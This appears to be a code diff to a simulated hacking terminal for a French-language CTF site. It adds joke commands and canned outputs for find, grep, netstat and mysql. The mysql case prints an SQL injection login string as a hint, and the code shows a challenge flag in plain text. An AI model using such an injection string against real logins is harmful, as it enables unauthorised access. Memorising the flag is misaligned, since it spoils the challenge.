+          return ['/tmp/cookie_flag.txt', '/tmp/.sql_dump', '/root/flag.txt'];
         }
         if (args.includes('-name') && args.includes('*.log')) {
           return ['/var/log/auth.log', '/var/log/syslog', '/var/log/mysql.log', '/var/log/.admin_access.log', '/home/.backup/logs.txt'];
@@ -501,6 +819,14 @@ INSERT INTO users VALUES (2, 'user', 'userpass', FALSE);`
         if (args.includes('admin') && args.includes('/etc/passwd')) {
           return ['No matches found'];
         }
+        if (args.includes('password') && args.includes('/home/user/')) {
+          return [
+            '/home/user/.secret_notes:- Mot de passe WiFi: 12345678 (Personne ne devinera!)',
+            '/home/user/downloads/wordlist.txt:password',
+            '/home/user/downloads/wordlist.txt:123456',
+            '/home/user/downloads/wordlist.txt:12345678'
+          ];
+        }
         return ['grep: no matches found'];
 
       case 'ps':
@@ -510,7 +836,8 @@ INSERT INTO users VALUES (2, 'user', 'userpass', FALSE);`
           '5678 pts/0    00:00:00 hidden_service',
           '9012 pts/0    00:00:00 mysql',
           '9013 pts/0    00:00:00 apache2',
-          '9014 pts/0    00:00:00 ps'
+          '9014 pts/0    00:00:00 ps',
+          '1337 pts/0    00:13:37 hack_the_planet'
         ];
 
       case 'netstat':
@@ -520,11 +847,12 @@ INSERT INTO users VALUES (2, 'user', 'userpass', FALSE);`
           'tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN',
           'tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN',
           'tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN',
-          'tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN'
+          'tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN',
+          'tcp        0      0 192.168.1.100:1337      1.1.1.1:443             ESTABLISHED'
         ];
 
       case 'whoami':
-        return [currentUser];
+        return [currentUser === 'root' ? 'root (mais avec grand pouvoir vient grande responsabilité)' : currentUser];
 
       case 'id':
         return [`uid=1000(${currentUser}) gid=1000(${currentUser}) groups=1000(${currentUser}),4(adm),24(cdrom),27(sudo)`];
@@ -553,16 +881,134 @@ INSERT INTO users VALUES (2, 'user', 'userpass', FALSE);`
             '<p>Flag: freep0nx{c00k13_m4n1pul4t10n_m4st3r}</p>'
           ];
         }
+        if (args.includes('ifconfig.me')) {
+          return [
+            '192.168.1.100',
+            '',
+            'PS: Maintenant je connais ton IP... Just kidding! (ou pas)'
+          ];
+        }
         return ['curl: command requires proper syntax'];
 
       case 'mysql':
         if (args.includes('-u') && args.includes('root')) {
           return [
             'ERROR 1045 (28000): Access denied for user \'root\'@\'localhost\' (using password: NO)',
-            'Hint: Try SQL injection techniques...'
+            'Hint: Try SQL injection techniques...',
+            'Like: mysql -u admin\' OR \'1\'=\'1\' -- -p'
           ];
         }
         return ['mysql: command not found or access denied'];
+
+      case 'fortune':
+        const fortunes = [
+          "Votre code va bientôt marcher... Probablement.",
+          "Un bon hacker est un hacker paresseux. Pourquoi faire en 10 commandes ce qu'on peut faire en 1 ?",
+          "Le meilleur moyen de prédire l'avenir, c'est de le coder.",
+          "Il y a deux façons de concevoir un logiciel : soit on le fait si simple qu'il n'y a pas de défauts évidents, soit on le fait si compliqué qu'il n'y a pas de défauts évidents.",
+          "// Je sais pas pourquoi ça marche, mais ça marche. Ne touche à rien !",
+          "Si debugger, c'est supprimer des bugs, alors programmer ne peut être que les ajouter.",
+          "Un expert est quelqu'un qui a fait toutes les erreurs possibles dans un domaine très étroit.",
+          "git commit -m \"Fix bug\"\ngit push\n...\nOh merde, c'était pas un bug, c'était une feature !",
+          "Je code donc je suis... un cafard numérique?",
+          "Il y a 10 types de personnes: ceux qui comprennent le binaire et les autres."
+        ];
+        return [fortunes[Math.floor(Math.random() * fortunes.length)]];
+
+      case 'cowsay':
+        if (args.length === 0) {
+          return [
+            " ___________",
+            "< Mooooooo >",
+            " -----------",
+            "        \\   ^__^",
+            "         \\  (oo)\\_______",
+            "            (__)\\       )\\/\\",
+            "                ||----w |",
+            "                ||     ||"
+          ];
+        }
+        const message = args.join(' ');
+        const lines = [];
+        lines.push(` ${'_'.repeat(message.length + 2)}`);
+        lines.push(`< ${message} >`);
+        lines.push(` ${'-'.repeat(message.length + 2)}`);
+        lines.push("        \\   ^__^");
+        lines.push("         \\  (oo)\\_______");
+        lines.push("            (__)\\       )\\/\\");
+        lines.push("                ||----w |");
+        lines.push("                ||     ||");
+        return lines;
+
+      case 'sl':
+        return [
+          "Tu voulais taper 'ls' mais tu as fait 'sl'...",
+          "",
+          "   (\\___/)",
+          "   (='.'=)",
+          "   (\")_(\")",
+          "",
+          "Un petit lapin pour te rappeler de taper plus vite la prochaine fois !"
+        ];
+
+      case 'vim':
+        return [
+          "Tu es entré dans Vim. Félicitations !",
+          "Maintenant, comment est-ce qu'on en sort ?",
+          "",
+          "Indice: Essaye :q! ou :wq si tu as fait des modifications",
+          "Mais sérieusement, utilise Nano comme tout le monde !"
+        ];
+
+      case 'emacs':
+        return [
+          "Démarrage d'Emacs...",
+          "Chargement des extensions...",
+          "Initialisation de l'interface...",
+          "Configuration des raccourcis clavier...",
+          "Compilation des packages...",
+          "",
+          "⚠️ Attention: Votre système a détecté que vous essayez de lancer Emacs.",
+          "Pour votre sécurité, cette commande a été bloquée.",
+          "Utilisez Vim à la place. Ou mieux, Nano."
+        ];
+
+      case 'nano':
+        return [
+          "Bienvenue dans GNU Nano, l'éditeur de texte pour les vrais hackers !",
+          "",
+          "^G Aide      ^O Écrire    ^W Rechercher ^K Couper    ^X Quitter",
+          "^J Justifier ^R Lire Fich ^\\ Remplacer ^U Coller    ^T Orthographe",
+          "",
+          "En train d'éditer: nouveau_fichier.txt",
+          "",
+          "PS: Tu peux aussi utiliser VS Code comme un pro 😎"
+        ];
+
+      case 'neofetch':
+        return [
+          `           -/oyddmdhs+:.               ${currentUser}@freep0nx-terminal`,
+          `       -o${"d".repeat(15)}hyo+:            -------------------`,
+          `     .y${"d".repeat(19)}/s+            OS: CTF Linux 1337.42`,
+          `   /s${"d".repeat(21)}y/              Host: Virtual Hacking Machine`,
+          `  /y${"d".repeat(22)}so               Kernel: 5.15.0-freep0nx`,
+          ` .y${"d".repeat(23)}s/                Uptime: 42 days, 6 hours, 9 mins`,
+          ` o${"d".repeat(24)}s                  Packages: 666 (pacman)`,
+          `+${"d".repeat(25)}s                   Shell: /bin/bash`,
+          `/y${"d".repeat(25)}s                   CPU: Hackintosh 9000 @ 4.20GHz`,
+          `s${"d".repeat(26)}s                    GPU: NVIDIA RTX 1337`,
+          `s${"d".repeat(26)}s                    Memory: 42GB / 1337GB`,
+          `s${"d".repeat(26)}s`,
+          `::${"d".repeat(25)}o:`,
+          ` :${"d".repeat(26)}o/`,
+          `  :${"d".repeat(25)}o/`,
+          `   -+${"d".repeat(23)}o+-`,
+          `     -:/${"d".repeat(19)}+/:-`,
+          `        -/${"d".repeat(15)}s/.-`,
+          `          .+${"d".repeat(11)}s+."`,
+          `              :/${"d".repeat(5)}+/:`,
+          `                 :+${"d"}s+:`
+        ];
 
       case 'clear':
         setHistory([]);
@@ -586,12 +1032,27 @@ INSERT INTO users VALUES (2, 'user', 'userpass', FALSE);`
           'whoami - show current user',
           'id - show user and group IDs',
           'download [file] - download files',
+          'fortune - display a random fortune',
+          'cowsay [message] - make a cow say something',
+          'sl - steam locomotive (when you type ls too fast)',
+          'neofetch - display system information',
           'clear - clear terminal',
           'help - show this help message'
         ];
 
       default:
-        return [`${command}: command not found`];
+        // Réponses aléatoires pour commandes inconnues
+        const unknownResponses = [
+          `${command}: command not found (mais as-tu essayé de redémarrer ?)`,
+          `Je connais pas ${command}... C'est un nouveau langage de programmation ?`,
+          `Commande '${command}' introuvable. Essaye 'sudo apt-get install clue'`,
+          `ERROR: '${command}' n'existe pas. Mais '${command} --help' aurait été une bonne idée !`,
+          `${command}: Permission denied (même si tu avais les droits, ça marcherait pas)`,
+          `Je sais pas faire ${command}. Je suis juste un terminal, pas un magicien!`,
+          `Commande '${command}' non trouvée. As-tu vérifié sous le canapé?`,
+          `zsh: command not found: ${command} (oups, mauvais shell)`
+        ];
+        return [unknownResponses[Math.floor(Math.random() * unknownResponses.length)]];
     }
   };
 
